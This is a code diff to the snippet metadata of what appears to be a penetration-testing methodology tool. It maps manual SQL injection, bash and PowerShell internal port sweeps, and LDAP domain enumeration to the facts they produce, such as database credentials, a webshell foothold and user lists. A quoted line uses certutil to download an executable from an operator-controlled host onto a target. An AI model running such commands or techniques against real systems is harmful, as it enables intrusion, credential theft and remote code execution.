@@ -467,17 +467,56 @@ certutil -urlcache -split -f http://{{lhost}}/tool.exe C:\\Users\\Public\\t.exe`
 (function(list){
   const PATH={
     // Manual SQLi stands in for sqlmap once a parameter is confirmed injectable (mirrors the
-    // sqlmap-automation card's prereq/produces so it slots into the same decision point).
-    'manual-sqli':{lane:'web',prereq:{any:['web.sqli_confirmed','web.parameterized']},produces:['db.creds','foothold.webshell']},
+    // sqlmap-automation card's prereq/produces so it slots into the same decision point). The
+    // produces set is exactly what the Build D output analyzer can emit, and every fact is a
+    // real Orange lane fact (sqli-union/sqli-enum consume web.sqli_confirmed→db.creds;
+    // sqli-file-ops produces foothold.webshell), so a confirmed paste advances the path.
+    'manual-sqli':{lane:'web',prereq:{any:['web.sqli_confirmed','web.parameterized']},produces:['web.sqli_confirmed','db.creds','foothold.webshell']},
     // Bash /dev/tcp sweep: pivot recon from a Linux foothold with nothing to upload.
     'portsweep-bash':{lane:'recon',prereq:{any:['foothold.linux','pivot.required','pivot.dual_homed']},produces:['scan.internal']},
     // PowerShell port sweep: the same pivot recon from a Windows foothold.
     'portscan-ps':{lane:'recon',prereq:{any:['foothold.windows']},produces:['scan.internal']},
     // LDAPSearch cookbook stands in for BloodHound/NetExec collection on a domain foothold.
-    ldapsearch:{lane:'ad',prereq:{any:['foothold.windows','ad.domain_known']},produces:['ad.enumerated']},
-    'ldap-cookbook':{lane:'ad',prereq:{any:['foothold.windows','ad.domain_known']},produces:['ad.enumerated']}
+    // Emits the same real facts the ad-psdotnet-enum Orange card produces (ad.user_list) plus
+    // ad.base_dn once the directory reveals the domain DN, so a confirmed paste advances the path.
+    ldapsearch:{lane:'ad',prereq:{any:['foothold.windows','ad.domain_known']},produces:['ad.user_list','ad.base_dn']},
+    'ldap-cookbook':{lane:'ad',prereq:{any:['foothold.windows','ad.domain_known']},produces:['ad.user_list','ad.base_dn']}
   };
   for(const s of list||[]){const m=PATH[s.id];if(m){s.pathProposable=true;for(const k in m)if(s[k]===undefined)s[k]=m[k];}}
+})(window.OBOL_SCRIPTS);
+
+// ---- Evidence ingestion: paste-back expectations (v10.13 Build D) -------------------------
+// Each path-proposable snippet declares how its OUTPUT is read back as Evidence: `card` is the
+// Orange methodology card the recorded activity is scoped to (so a paste preserves its source
+// and the Path/Card surfaces recalculate from it), `expects` are the operator-facing paste-back
+// cues shown on the snippet, and `facts` is the conservative fact set the output analyzer may
+// emit — always a subset of `produces`. The analyzer itself (regex signal matching) lives in
+// `assets/script-output-evidence-current.js`; it emits a fact ONLY when the output carries a
+// strong success signal (extracted rows, a returned command result, real directory entries),
+// never from mere command recognition (docs/PROOF-CONTRACT.md). Attaching this metadata runs
+// nothing — these remain offline, human-run snippets whose output the operator pastes by hand.
+(function(list){
+  const EVIDENCE={
+    'manual-sqli':{card:'sqli-union',facts:['web.sqli_confirmed','db.creds','foothold.webshell'],expects:[
+      'A true-vs-false page difference or a SQL error (syntax / extractvalue / conversion) confirms the injection is live — not just that a request was sent.',
+      'group_concat rows in the form user:hash (or an information_schema dump with real data) confirm credential extraction.',
+      'A command result echoed in the response from the written webshell (uid=…, a whoami line, hostname) confirms RCE — the INTO OUTFILE / xp_cmdshell request alone does not.']},
+    'portsweep-bash':{card:'linux-enum',facts:['scan.internal'],expects:[
+      'Only lines that report an open service (host:port open / "<port> open") record an internal-reach observation.',
+      'An empty run, or connection-refused/unreachable output, records nothing — a completed sweep is not a discovery.']},
+    'portscan-ps':{card:'windows-enum',facts:['scan.internal'],expects:[
+      'Only "<port> open" result lines record an internal-reach observation.',
+      'A run with no open-port lines records nothing.']},
+    ldapsearch:{card:'ad-psdotnet-enum',facts:['ad.user_list','ad.base_dn'],expects:[
+      'Directory entries (distinguishedName / sAMAccountName / CN= user objects) confirm the enumeration returned data.',
+      'A DC=…,DC=… distinguished name reveals the domain base DN.',
+      'An error (server not operational, invalid credentials, access denied) records nothing.']},
+    'ldap-cookbook':{card:'ad-psdotnet-enum',facts:['ad.user_list','ad.base_dn'],expects:[
+      'sAMAccountName / description rows returned by the cookbook queries confirm enumeration.',
+      'A DC=…,DC=… distinguished name reveals the domain base DN.',
+      'An empty or errored query records nothing.']}
+  };
+  for(const s of list||[]){const m=EVIDENCE[s.id];if(m&&s.evidence===undefined)s.evidence=m;}
 })(window.OBOL_SCRIPTS);
 ;
 /* obol-runtime-fragment: data/scripts-v2.5.js */
